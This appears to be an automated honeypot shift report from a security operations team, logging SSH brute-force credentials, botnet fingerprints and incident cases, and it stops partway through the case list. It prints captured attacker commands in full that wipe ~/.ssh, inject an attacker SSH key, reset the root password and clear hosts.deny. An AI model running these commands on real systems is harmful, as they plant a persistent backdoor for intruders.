# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-12 |
| **Generated At** | 2026-06-12T15:23:27Z |
| **Shift Time** | 15:23 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **624** |
| Confirmed Threats | **578** |
| False Positives Filtered | **46** (7.4%) |
| Unique Attacker IPs | **77** |
| Countries of Origin | **25** |
| High Severity Cases | **191** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **433** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **496** |
| Unique Credential Pairs | **138** |
| Unique Usernames | **80** |
| Unique Passwords | **120** |
| Successful Auth Pairs | **117** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 192 |
| `345gs5662d34` | 93 |
| `admin` | 14 |
| `ubuntu` | 12 |
| `postgres` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 93 |
| `3245gs5662d34` | 92 |
| `123456` | 22 |
| `123` | 9 |
| `1234` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 93 |
| `root` | `3245gs5662d34` | 92 |
| `root` | `a123456!` | 7 |
| `admin` | `Password01` | 6 |
| `ubuntu` | `99999999` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `abc@2024` | `102.220.87.78` | 2026-06-12T10:21:21 |
| `root` | `3245gs5662d34` | `102.220.87.78` | 2026-06-12T10:21:27 |
| `root` | `Test123!!` | `45.196.236.141` | 2026-06-12T10:24:36 |
| `root` | `3245gs5662d34` | `45.196.236.141` | 2026-06-12T10:24:40 |
| `root` | `dev@2024` | `45.196.236.141` | 2026-06-12T10:26:31 |
| `root` | `toto` | `103.180.213.153` | 2026-06-12T10:32:08 |
| `root` | `17161716` | `45.196.236.141` | 2026-06-12T10:32:11 |
| `root` | `rahul@123` | `45.196.236.141` | 2026-06-12T10:34:01 |
| `root` | `Ubuntu@123` | `45.196.236.141` | 2026-06-12T10:41:56 |
| `root` | `toto` | `45.196.236.141` | 2026-06-12T10:51:28 |
| `root` | `Aaa` | `45.196.236.141` | 2026-06-12T10:57:28 |
| `root` | `Huawei@123` | `45.196.236.141` | 2026-06-12T10:59:32 |
| `root` | `Hello1234` | `45.196.236.141` | 2026-06-12T11:01:32 |
| `root` | `admin` | `121.239.227.101` | 2026-06-12T11:02:34 |
| `root` | `aptx4869` | `45.196.236.141` | 2026-06-12T11:07:17 |
| `root` | `qqww` | `45.196.236.141` | 2026-06-12T11:09:12 |
| `root` | `Zxcvbnm123456` | `45.196.236.141` | 2026-06-12T11:12:09 |
| `root` | `1Q2w3e4r` | `45.196.236.141` | 2026-06-12T11:16:03 |
| `root` | `Qwertyuiop2026` | `45.196.236.141` | 2026-06-12T11:18:01 |
| `root` | `1q2w3e4r5tA` | `45.196.236.141` | 2026-06-12T11:20:04 |
| `root` | `Mx123456.` | `175.182.37.66` | 2026-06-12T11:20:28 |
| `root` | `3245gs5662d34` | `175.182.37.66` | 2026-06-12T11:20:39 |
| `root` | `1029` | `175.182.37.66` | 2026-06-12T11:34:24 |
| `root` | `rahul@123` | `103.180.213.153` | 2026-06-12T11:35:58 |
| `root` | `3245gs5662d34` | `103.180.213.153` | 2026-06-12T11:35:59 |
| `root` | `1Q2w3e4r` | `103.180.213.153` | 2026-06-12T11:39:00 |
| `root` | `Admin.12` | `175.182.37.66` | 2026-06-12T11:41:22 |
| `root` | `raisecom` | `175.182.37.66` | 2026-06-12T11:44:40 |
| `root` | `Hello1234` | `103.180.213.153` | 2026-06-12T11:44:44 |
| `root` | `Aaa` | `103.180.213.153` | 2026-06-12T11:47:43 |
| `root` | `Test123!!` | `103.180.213.153` | 2026-06-12T11:58:35 |
| `root` | `a123456!` | `45.136.50.69` | 2026-06-12T13:03:11 |
| `root` | `3245gs5662d34` | `45.136.50.69` | 2026-06-12T13:03:16 |
| `root` | `a123456!` | `171.25.158.80` | 2026-06-12T13:09:18 |
| `root` | `3245gs5662d34` | `171.25.158.80` | 2026-06-12T13:09:23 |
| `root` | `admin$2024` | `183.82.120.244` | 2026-06-12T13:10:39 |
| `root` | `3245gs5662d34` | `183.82.120.244` | 2026-06-12T13:10:40 |
| `root` | `Alpha@123` | `178.255.72.35` | 2026-06-12T13:11:07 |
| `root` | `3245gs5662d34` | `178.255.72.35` | 2026-06-12T13:11:10 |
| `root` | `Alpha@123` | `122.35.192.61` | 2026-06-12T13:11:10 |
| `root` | `3245gs5662d34` | `122.35.192.61` | 2026-06-12T13:11:14 |
| `root` | `huawei123` | `103.250.149.148` | 2026-06-12T13:11:37 |
| `root` | `6windos` | `178.255.72.35` | 2026-06-12T13:12:46 |
| `root` | `!QAZxdr5` | `122.35.192.61` | 2026-06-12T13:13:44 |
| `root` | `admin$2024` | `171.25.158.80` | 2026-06-12T13:15:18 |
| `root` | `woaini123.` | `171.25.158.80` | 2026-06-12T13:19:11 |
| `root` | `ZAQ!1qaz` | `185.99.99.95` | 2026-06-12T13:20:43 |
| `root` | `3245gs5662d34` | `185.99.99.95` | 2026-06-12T13:20:47 |
| `root` | `root66` | `183.82.120.244` | 2026-06-12T13:24:09 |
| `root` | `Google123` | `178.255.72.35` | 2026-06-12T13:24:51 |
| `root` | `Linux123` | `171.25.158.80` | 2026-06-12T13:25:08 |
| `root` | `Newton1` | `122.35.192.61` | 2026-06-12T13:28:41 |
| `root` | `dell` | `171.25.158.80` | 2026-06-12T13:29:14 |
| `root` | `woaini123.` | `183.82.120.244` | 2026-06-12T13:29:35 |
| `root` | `Linux123` | `185.99.99.95` | 2026-06-12T13:30:25 |
| `root` | `password123*` | `185.99.99.95` | 2026-06-12T13:32:59 |
| `root` | `Dg123456` | `210.79.191.76` | 2026-06-12T13:35:35 |
| `root` | `3245gs5662d34` | `210.79.191.76` | 2026-06-12T13:35:39 |
| `root` | `Hh123456789` | `122.35.192.61` | 2026-06-12T13:36:15 |
| `root` | `aa147258` | `210.79.191.76` | 2026-06-12T13:36:19 |
| `root` | `linux123` | `210.79.191.76` | 2026-06-12T13:36:42 |
| `root` | `ZAQ!1qaz` | `183.82.120.244` | 2026-06-12T13:37:56 |
| `root` | `woaini123.` | `185.99.99.95` | 2026-06-12T13:38:09 |
| `root` | `!QAZxdr5` | `178.255.72.35` | 2026-06-12T13:38:51 |
| `root` | `dell` | `98.26.115.52` | 2026-06-12T13:39:43 |
| `root` | `3245gs5662d34` | `98.26.115.52` | 2026-06-12T13:39:49 |
| `root` | `qweasdzxc123.` | `185.99.99.95` | 2026-06-12T13:40:47 |
| `root` | `qweasdzxc123.` | `171.25.158.80` | 2026-06-12T13:41:41 |
| `root` | `Linux123` | `179.184.160.50` | 2026-06-12T13:41:58 |
| `root` | `3245gs5662d34` | `179.184.160.50` | 2026-06-12T13:42:06 |
| `root` | `ZAQ!1qaz` | `171.25.158.80` | 2026-06-12T13:43:40 |
| `root` | `woaini123.` | `98.26.115.52` | 2026-06-12T13:46:04 |
| `root` | `root66` | `171.25.158.80` | 2026-06-12T13:47:43 |
| `root` | `Google123` | `122.35.192.61` | 2026-06-12T13:51:32 |
| `root` | `Root` | `46.77.69.201` | 2026-06-12T13:52:34 |
| `root` | `password123*` | `98.26.115.52` | 2026-06-12T13:52:35 |
| `root` | `Hh123456789` | `178.255.72.35` | 2026-06-12T13:52:42 |
| `root` | `Root` | `112.26.101.76` | 2026-06-12T13:52:43 |
| `root` | `Smart@2022` | `114.220.176.69` | 2026-06-12T13:53:16 |
| `root` | `password123*` | `171.25.158.80` | 2026-06-12T13:53:43 |
| `root` | `qweasdzxc123.` | `183.82.120.244` | 2026-06-12T13:54:34 |
| `root` | `dell` | `185.99.99.95` | 2026-06-12T13:55:53 |
| `root` | `Asd12345@` | `178.255.72.35` | 2026-06-12T13:56:22 |
| `root` | `Newton1` | `178.255.72.35` | 2026-06-12T13:58:10 |
| `root` | `woaini123.` | `179.184.160.50` | 2026-06-12T13:58:20 |
| `root` | `password123*` | `183.82.120.244` | 2026-06-12T14:00:12 |
| `root` | `aaaa` | `171.237.176.209` | 2026-06-12T14:01:44 |
| `root` | `3245gs5662d34` | `171.237.176.209` | 2026-06-12T14:01:49 |
| `root` | `dell` | `179.184.160.50` | 2026-06-12T14:02:23 |
| `root` | `Linux123` | `98.26.115.52` | 2026-06-12T14:02:27 |
| `root` | `qweasdzxc123.` | `179.184.160.50` | 2026-06-12T14:06:26 |
| `root` | `ZAQ!1qaz` | `89.117.50.180` | 2026-06-12T14:10:32 |
| `root` | `3245gs5662d34` | `89.117.50.180` | 2026-06-12T14:10:36 |
| `root` | `a123456!` | `183.82.120.244` | 2026-06-12T14:11:22 |
| `root` | `qweasdzxc123.` | `98.26.115.52` | 2026-06-12T14:12:11 |
| `root` | `admin$2024` | `185.99.99.95` | 2026-06-12T14:13:32 |
| `root` | `Asd12345@` | `122.35.192.61` | 2026-06-12T14:13:54 |
| `root` | `dell` | `183.82.120.244` | 2026-06-12T14:14:05 |
| `root` | `root66` | `98.26.115.52` | 2026-06-12T14:15:29 |
| `root` | `root66` | `185.99.99.95` | 2026-06-12T14:16:03 |
| `root` | `Google123` | `103.151.140.79` | 2026-06-12T14:16:31 |
| `root` | `3245gs5662d34` | `103.151.140.79` | 2026-06-12T14:16:34 |
| `root` | `Linux123` | `183.82.120.244` | 2026-06-12T14:16:40 |
| `root` | `dell` | `89.117.50.180` | 2026-06-12T14:17:44 |
| `root` | `a123456!` | `185.99.99.95` | 2026-06-12T14:18:46 |
| `root` | `a123456!` | `89.117.50.180` | 2026-06-12T14:20:08 |
| `root` | `ZAQ!1qaz` | `98.26.115.52` | 2026-06-12T14:22:14 |
| `root` | `root66` | `179.184.160.50` | 2026-06-12T14:22:34 |
| `root` | `admin$2024` | `98.26.115.52` | 2026-06-12T14:31:48 |
| `root` | `a123456!` | `179.184.160.50` | 2026-06-12T14:38:52 |
| `root` | `a123456!` | `98.26.115.52` | 2026-06-12T14:41:22 |
| `root` | `admin$2024` | `179.184.160.50` | 2026-06-12T14:54:57 |
| `root` | `159357456` | `192.3.150.139` | 2026-06-12T15:00:09 |
| `root` | `3245gs5662d34` | `192.3.150.139` | 2026-06-12T15:00:16 |
| `root` | `ZAQ!1qaz` | `179.184.160.50` | 2026-06-12T15:06:57 |
| `root` | `qwe123QWE` | `197.199.224.52` | 2026-06-12T15:10:00 |
| `root` | `3245gs5662d34` | `197.199.224.52` | 2026-06-12T15:10:04 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **624** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 541 |
| OpenSSH | 9 |
| Go SSH scanner | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 342 | 21 |
| `03a80b21afa8...` | Modern SSH client | 175 | 6 |
| `acaa53e0a7d7...` | Mirai/variant | 8 | 8 |
| `f45fb203c310...` | Mirai/variant | 1 | 1 |
| `748f8c627d3f...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 342 | 21 | Mirai/variant |
| `03a80b21afa8...` | libssh | 175 | 6 | Modern SSH client |
| `95420f9d932d...` | libssh | 22 | 2 | — |
| `acaa53e0a7d7...` | OpenSSH | 8 | 8 | Mirai/variant |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |
| `748f8c627d3f...` | Unknown | 1 | 1 | Mirai/variant |
| `2aec6b44b06b...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `c118de82e19e...` | OpenSSH | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 93 | 18 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:9KN1pDM2DK6x"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `114.220.176.69`, `122.35.192.61`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `192.3.150.139`, `102.220.87.78`, `171.237.176.209`, `175.182.37.66`, `183.82.120.244`, `103.151.140.79`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **77** |
| Unique ASNs | **53** |
| High-Risk ASNs | **40** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS46562` | Performive LLC | 5 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | MEDIUM |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (191)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3ef7fdf4f34d

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 10:21 |
| **Last Seen** | 2026-06-12 10:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:21:19` | `cowrie.session.connect` |
| `2026-06-12 10:21:19` | `cowrie.client.version` |
| `2026-06-12 10:21:20` | `cowrie.client.kex` |
| `2026-06-12 10:21:21` | `cowrie.login.success` |
| `2026-06-12 10:21:21` | `cowrie.session.params` |
| `2026-06-12 10:21:21` | `cowrie.command.input` |
| `2026-06-12 10:21:21` | `cowrie.command.failed` |
| `2026-06-12 10:21:22` | `cowrie.log.closed` |
| `2026-06-12 10:21:22` | `cowrie.session.params` |
| `2026-06-12 10:21:22` | `cowrie.command.input` |
| `2026-06-12 10:21:23` | `cowrie.session.file_download` |
| `2026-06-12 10:21:23` | `cowrie.log.closed` |
| `2026-06-12 10:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-219215141663

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 10:21 |
| **Last Seen** | 2026-06-12 10:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:21:26` | `cowrie.session.connect` |
| `2026-06-12 10:21:26` | `cowrie.client.version` |
| `2026-06-12 10:21:26` | `cowrie.client.kex` |
| `2026-06-12 10:21:27` | `cowrie.login.success` |
| `2026-06-12 10:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c72d0dd34be

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:24 |
| **Last Seen** | 2026-06-12 10:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:24:36` | `cowrie.session.connect` |
| `2026-06-12 10:24:36` | `cowrie.client.version` |
| `2026-06-12 10:24:36` | `cowrie.client.kex` |
| `2026-06-12 10:24:36` | `cowrie.login.success` |
| `2026-06-12 10:24:37` | `cowrie.session.params` |
| `2026-06-12 10:24:37` | `cowrie.command.input` |
| `2026-06-12 10:24:37` | `cowrie.command.failed` |
| `2026-06-12 10:24:37` | `cowrie.log.closed` |
| `2026-06-12 10:24:37` | `cowrie.session.params` |
| `2026-06-12 10:24:37` | `cowrie.command.input` |
| `2026-06-12 10:24:37` | `cowrie.session.file_download` |
| `2026-06-12 10:24:37` | `cowrie.log.closed` |
| `2026-06-12 10:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27135f5b6c6f

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:24 |
| **Last Seen** | 2026-06-12 10:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:24:39` | `cowrie.session.connect` |
| `2026-06-12 10:24:39` | `cowrie.client.version` |
| `2026-06-12 10:24:40` | `cowrie.client.kex` |
| `2026-06-12 10:24:40` | `cowrie.login.success` |
| `2026-06-12 10:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-259b1b0111e5

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:26 |
| **Last Seen** | 2026-06-12 10:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:26:30` | `cowrie.session.connect` |
| `2026-06-12 10:26:30` | `cowrie.client.version` |
| `2026-06-12 10:26:30` | `cowrie.client.kex` |
| `2026-06-12 10:26:31` | `cowrie.login.success` |
| `2026-06-12 10:26:31` | `cowrie.session.params` |
| `2026-06-12 10:26:31` | `cowrie.command.input` |
| `2026-06-12 10:26:31` | `cowrie.command.failed` |
| `2026-06-12 10:26:32` | `cowrie.log.closed` |
| `2026-06-12 10:26:32` | `cowrie.session.params` |
| `2026-06-12 10:26:32` | `cowrie.command.input` |
| `2026-06-12 10:26:32` | `cowrie.session.file_download` |
| `2026-06-12 10:26:32` | `cowrie.log.closed` |
| `2026-06-12 10:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99808249cf58

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:26 |
| **Last Seen** | 2026-06-12 10:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:26:34` | `cowrie.session.connect` |
| `2026-06-12 10:26:34` | `cowrie.client.version` |
| `2026-06-12 10:26:34` | `cowrie.client.kex` |
| `2026-06-12 10:26:35` | `cowrie.login.success` |
| `2026-06-12 10:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ae56fe88aba

| Field | Detail |
|---|---|
| **Source IP** | `103.180.213[.]153` |
| **First Seen** | 2026-06-12 10:32 |
| **Last Seen** | 2026-06-12 10:32 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:32:08` | `cowrie.session.connect` |
| `2026-06-12 10:32:08` | `cowrie.client.version` |
| `2026-06-12 10:32:08` | `cowrie.client.kex` |
| `2026-06-12 10:32:08` | `cowrie.login.success` |
| `2026-06-12 10:32:08` | `cowrie.session.params` |
| `2026-06-12 10:32:08` | `cowrie.command.input` |
| `2026-06-12 10:32:08` | `cowrie.command.failed` |
| `2026-06-12 10:32:08` | `cowrie.log.closed` |
| `2026-06-12 10:32:08` | `cowrie.session.params` |
| `2026-06-12 10:32:08` | `cowrie.command.input` |
| `2026-06-12 10:32:09` | `cowrie.session.file_download` |
| `2026-06-12 10:32:09` | `cowrie.log.closed` |
| `2026-06-12 10:32:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.180.213[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.180.213[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1bbbb9f6d37

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:32 |
| **Last Seen** | 2026-06-12 10:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
